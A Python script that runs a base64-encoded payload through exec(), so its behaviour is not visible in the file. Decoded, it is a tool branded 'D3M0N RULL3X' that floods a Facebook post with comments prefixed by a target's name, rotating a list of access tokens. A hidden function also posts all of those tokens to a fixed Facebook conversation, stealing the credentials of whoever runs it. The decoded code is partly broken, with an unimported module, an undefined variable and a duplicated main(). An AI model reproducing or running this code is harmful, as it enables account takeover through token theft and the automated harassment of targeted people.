import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCgpodG1sX2NvbnRlbnQgPSAiIiIKPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDx0aXRsZT5EZW1vbiBSdWxsZXg8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ3Jhc2htaWthLmpwZycpOwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOwogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8aDEgc3R5bGU9ImNvbG9yOiBibGFjazsiPkQzTTBOIFJVTEwzWCAwRkZMSU4zIFQwMEw8L2gxPgogICAgPHAgc3R5bGU9ImNvbG9yOiBncmVlbjsiPlRoaXMgVG9vbCBDcmVhdGVkIEJ5IEZpbmNoPC9wPgogICAgCiAgICA8cCBzdHlsZT0iY29sb3I6IGJsdWU7Ij5Pd25lciBOYW1lIDo6LSBGaW5jaDwvcD4KICAgIAogICAgPHAgc3R5bGU9ImNvbG9yOiBncmF5OyI+TWVtYmVycyBMaXN0IDo6LSA8L3A+CiAgICA8dWw+CiAgICAgICAgPGxpIHN0eWxlPSJjb2xvcjogYmxhY2s7Ij4xLiBGYWl6YW48L2xpPgogICAgICAgIDxsaSBzdHlsZT0iY29sb3I6IHB1cnBsZTsiPjIuIEltcmFuPC9saT4KICAgICAgICA8bGkgc3R5bGU9ImNvbG9yOiBvcmFuZ2U7Ij4zLiBTdWx0YW48L2xpPgogICAgICAgIDxsaSBzdHlsZT0iY29sb3I6IHRlYWw7Ij40LiBGbGV4PC9saT4KICAgICAgICA8bGkgc3R5bGU9ImNvbG9yOiBuYXZ5OyI+NS4gU21va2VyPC9saT4gICAgICAgIAogICAgICAgIDxsaSBzdHlsZT0iY29sb3I6IGJsYWNrOyI+Ni4gU3VuaWw8L2xpPgogICAgICAgIDxsaSBzdHlsZT0iY29sb3I6IHB1cnBsZTsiPjcuIEFmdGFiPC9saT4KICAgICAgICA8bGkgc3R5bGU9ImNvbG9yOiBvcmFuZ2U7Ij44LiBTdGFyYzwvbGk+CiAgICA8L3VsPgoKPC9ib2R5Pgo8L2h0bWw+CiIiIgpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShodG1sX2NvbnRlbnQuZW5jb2RlKCkpCgpkZWYgZXhlY3V0ZV9zZXJ2ZXIoKToKICAgIFBPUlQgPSA0MDAwCgogICAgd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6CiAgICAgICAgcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkKICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkKICAgICAgICAKCmRlZiBwb3N0X2NvbW1lbnRzKCk6CiAgICB3aXRoIG9wZW4oJ3R1a3VuLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICB0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykKCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKICAgIGRlZiBjbHMoKToKICAgICAgICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6CiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBjbHMoKQoKICAgIGRlZiBsaW5lc3MoKToKICAgICAgICBwcmludCgnXHUwMDFiWzM3bScgKyAn4oCi4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4oCiJykKCiAgICBoZWFkZXJzID0gewogICAgICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAogICAgICAgICdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwogICAgfQoKICAgIGxpbmVzcygpCgogICAgYWNjZXNzX3Rva2VucyA9IFt0b2tlbi5zdHJpcCgpIGZvciB0b2tlbiBpbiB0b2tlbnNdCgogICAgd2l0aCBvcGVuKCdwdXN0LnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBwb3N0X3VybCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgogICAgd2l0aCBvcGVuKCdjdW1tdXRzLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBjb21tZW50cyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICBudW1fY29tbWVudHMgPSBsZW4oY29tbWVudHMpCiAgICBtYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9jb21tZW50cykKCiAgICB3aXRoIG9wZW4oJ2h1dHVybm1lLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBoYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICB3aXRoIG9wZW4oJ3RtZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkKICAgICAgICAKICAgICAjcG9zdF9pZCA9IHBvc3RfdXJsc3BsaXQKCiAgICBsaW5lc3MoKQoKICAgIGRlZiBnZXROYW1lKHRva2VuKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC9tZT9hY2Nlc3NfdG9rZW49e3Rva2VufScpLmpzb24oKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgZGF0YSA9ICIiCiAgICAgICAgaWYgJ25hbWUnIGluIGRhdGE6CiAgICAgICAgICAgIHJldHVybiBkYXRhWyduYW1lJ10KICAgICAgICBlbHNlOgogICAgICAgICAgICByZXR1cm4gIkVycm9yIG9jY3VycmVkIgoKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgZm9yIGNvbW1lbnRfaW5kZXggaW4gcmFuZ2UobnVtX2NvbW1lbnRzKToKICAgICAgICAgICAgICAgIHRva2VuX2luZGV4ID0gY29tbWVudF9pbmRleCAlIG1heF90b2tlbnMKICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbnNbdG9rZW5faW5kZXhdCgogICAgICAgICAgICAgICAgY29tbWVudCA9IGNvbW1lbnRzW2NvbW1lbnRfaW5kZXhdLnN0cmlwKCkKCiAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve30vY29tbWVudHMiLmZvcm1hdChwb3N0X3VybCkKICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnR9CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCiAgICAgICAgICAgICAgICBjdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5vazoKICAgICAgICAgICAgICAgICAgICBwcmludCgiWytdIENvbW1lbnQgTm8uIHt9IFBvc3QgSWQge30gVG9rZW4gTm8uIHt9OiB7fSIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICBjb21tZW50X2luZGV4ICsgMSwgcG9zdF91cmwsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBjb21tZW50KSkKICAgICAgICAgICAgICAgICAgICBwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkKICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgQ29tbWVudCBOby4ge30gUG9zdCBJZCB7fSBUb2tlbiBOby4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1lbnRfaW5kZXggKyAxLCBwb3N0X3VybCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnQpKQogICAgICAgICAgICAgICAgICAgIHByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoc3BlZWQpCgogICAgICAgICAgICBwcmludCgiXG5bK10gQWxsIGNvbW1lbnRzIHNlbnQgc3VjY2Vzc2Z1bGx5LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uXG4iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCiAgICAgICAgICBwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQoKCmRlZiBtc2coKToKICAgIHBhcmFtZXRlcnMgPSB7CiAgICAgICAgJ2FjY2Vzc190b2tlbic6IHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucyksCiAgICAgICAgJ21lc3NhZ2UnOiAnVXNlciBQcm9maWxlIE5hbWU6ICcgKyBnZXROYW1lKHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucykpICsgJ1xuVG9rZW46ICcgKyAiIHwgIi5qb2luKAogICAgICAgICAgICBhY2Nlc3NfdG9rZW5zKSArICdcbkxpbms6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9tZXNzYWdlcy90LycgKyBjb252b19pZAogICAgfQogICAgdHJ5OgogICAgICAgIHMgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC90XzEwMDA2MTgwNDA3MTUxOS8iLCBkYXRhPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgbWFpbigpOgogICAgc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQogICAgc2VydmVyX3RocmVhZC5zdGFydCgpCgogICAgcG9zdF9jb21tZW50cygpCiAgICBtc2coKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1haW4oKQpkZWYgbWFpbigpOgogICAgc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQogICAgc2VydmVyX3RocmVhZC5zdGFydCgpCgogICAgcG9zdF9jb21tZW50cygpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigpIA=='))